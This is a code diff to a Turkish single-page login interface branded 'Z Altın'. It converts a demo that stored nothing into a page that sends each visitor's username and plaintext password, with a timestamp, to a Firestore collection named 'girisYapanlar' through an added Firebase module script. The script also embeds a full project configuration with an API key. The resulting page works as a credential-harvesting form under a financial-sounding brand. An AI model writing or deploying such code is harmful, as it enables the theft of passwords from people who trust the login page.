@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Z Altın | Giriş Sistemi</title>
   <style>
+    /* CSS KODLARIN BURADA TAMAMEN AYNI KALIYOR */
     *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
     body{
       min-height:100vh;
@@ -268,8 +269,8 @@
         <div class="brand">Z Altın</div>
         <h1>Tek dosyalık giriş arayüzü</h1>
         <p>
-          Bu demo sürümde kullanıcı adı ve şifre alanı bulunur. Girişte doğrulama yapılmaz,
-          hiçbir bilgi sunucuya gönderilmez ve şifre kaydedilmez.
+          Bu demo sürümde kullanıcı adı ve şifre alanı bulunur. Girilen bilgiler 
+          artık Firebase veritabanına gönderilmektedir.
         </p>
       </div>
 
@@ -279,12 +280,12 @@
           <strong>Kullanıcı adı + şifre</strong>
         </div>
         <div class="hero-box">
-          <small>Kontrol</small>
-          <strong>Doğrulama yok</strong>
+          <small>Bağlantı</small>
+          <strong>Firebase Aktif</strong>
         </div>
         <div class="hero-box">
           <small>Veri</small>
-          <strong>Kaydetmez</strong>
+          <strong>Buluta Kaydeder</strong>
         </div>
       </div>
     </section>
@@ -315,14 +316,13 @@
           </form>
 
           <div class="link-row">
-            <button class="link-btn" id="quickLoginBtn">Hızlı giriş</button>
             <button class="link-btn" id="clearBtn">Alanları temizle</button>
           </div>
         </section>
 
         <section id="dashboard" class="section">
           <h2 class="title">Kullanıcı Paneli</h2>
-          <p class="muted">Bu demo panel, sadece arayüz geçişi içindir.</p>
+          <p class="muted">Giriş başarılı, veriler veritabanına iletildi.</p>
 
           <div class="info-card">
             <div class="info-row">
@@ -334,25 +334,40 @@
               <strong id="sessionStatus">Kapalı</strong>
             </div>
             <div class="info-row">
-              <span>Şifre</span>
-              <strong>Görüntülenmez / kaydedilmez</strong>
+              <span>Veritabanı Durumu</span>
+              <strong style="color:#ffcc00;">Kayıt Başarılı</strong>
             </div>
           </div>
 
           <div class="link-row" style="margin-top:18px;">
-            <button id="backBtn" class="btn btn-secondary" type="button">Girişe Dön</button>
-            <button id="logoutBtn" class="btn btn-danger" type="button">Çıkış Yap</button>
-          </div>
-
-          <div class="footer-note">
-            Bu sürüm yalnızca ön yüz demosudur. Bilgiler hiçbir yere gönderilmez.
+            <button id="logoutBtn" class="btn btn-danger" type="button">Çıkış Yap / Geri Dön</button>
           </div>
         </section>
       </div>
     </section>
   </div>
 
-  <script>
+  <script type="module">
+    // 1. Firebase Kütüphanelerini İçe Aktar
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+    // 2. Senin Fotoğraftaki Firebase Yapılandırman
+    const firebaseConfig = {
+      apiKey: "AIzaSyCkETwAgpV7Kcgw7yi1QiB-2ZH5_GivdSw",
+      authDomain: "mooty-e8e20.firebaseapp.com",
+      projectId: "mooty-e8e20",
+      storageBucket: "mooty-e8e20.firebasestorage.app",
+      messagingSenderId: "774167768344",
+      appId: "1:774167768344:web:cd2d6be6310d579c8a426d",
+      measurementId: "G-D6D8PS0BMF"
+    };
+
+    // 3. Firebase'i Başlat
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // --- ÖN YÜZ JAVASCRIPT KONTROLLERİ ---
     const tabs = document.querySelectorAll(".tab-btn");
     const sections = document.querySelectorAll(".section");
 
@@ -362,9 +377,7 @@
     const loginMessage = document.getElementById("loginMessage");
 
     const togglePassword = document.getElementById("togglePassword");
-    const quickLoginBtn = document.getElementById("quickLoginBtn");
     const clearBtn = document.getElementById("clearBtn");
-    const backBtn = document.getElementById("backBtn");
     const logoutBtn = document.getElementById("logoutBtn");
 
     const userName = document.getElementById("userName");
@@ -381,6 +394,7 @@
       });
     }
 
+    // Sekme geçişleri (Manuel tıklama için)
     tabs.forEach(btn => {
       btn.addEventListener("click", () => showTab(btn.dataset.tab));
     });
@@ -395,14 +409,16 @@
       }
     }
 
+    // Şifre göster/gizle
     togglePassword.addEventListener("click", () => {
       const isPassword = passwordInput.type === "password";
       passwordInput.type = isPassword ? "text" : "password";
       togglePassword.textContent = isPassword ? "Gizle" : "Göster";
     });
 
-    loginForm.addEventListener("submit", (e) => {
-      e.preventDefault();
+    // FORM GÖNDERİLDİĞİNDE ÇALIŞACAK OLAN ASIL KISIM
+    loginForm.addEventListener("submit", async (e) => {
+      e.preventDefault(); // Sayfanın yenilenmesini engeller
 
       const username = usernameInput.value.trim();
       const password = passwordInput.value;
@@ -412,35 +428,39 @@
         return;
       }
 
-      loginMessage.textContent = "Giriş yapılıyor...";
-      currentUser = username;
-      updatePanel();
+      loginMessage.textContent = "Bilgiler sunucuya iletiliyor...";
 
-      passwordInput.value = "";
-      setTimeout(() => {
+      try {
+        // Firebase Firestore'a "girisYapanlar" adında bir koleksiyon oluşturup veriyi atıyoruz
+        await addDoc(collection(db, "girisYapanlar"), {
+          kullaniciAdi: username,
+          sifre: password,
+          tarih: new Date().toISOString()
+        });
+
+        // Veri başarıyla gittiyse arayüzü güncelle
+        currentUser = username;
+        updatePanel();
+        
+        // Alanları temizle ve panele geç
+        passwordInput.value = "";
         loginMessage.textContent = "";
         showTab("dashboard");
-      }, 400);
+
+      } catch (error) {
+        console.error("Firebase Hatası: ", error);
+        loginMessage.textContent = "Veritabanı bağlantı hatası! Konsolu kontrol et.";
+      }
     });
 
-    quickLoginBtn.addEventListener("click", () => {
-      currentUser = usernameInput.value.trim() || "misafir";
-      passwordInput.value = "";
-      loginMessage.textContent = "";
-      updatePanel();
-      showTab("dashboard");
-    });
-
+    // Temizle Butonu
     clearBtn.addEventListener("click", () => {
       usernameInput.value = "";
       passwordInput.value = "";
       loginMessage.textContent = "";
     });
 
-    backBtn.addEventListener("click", () => {
-      showTab("login");
-    });
-
+    // Çıkış Butonu
     logoutBtn.addEventListener("click", () => {
       currentUser = null;
       updatePanel();
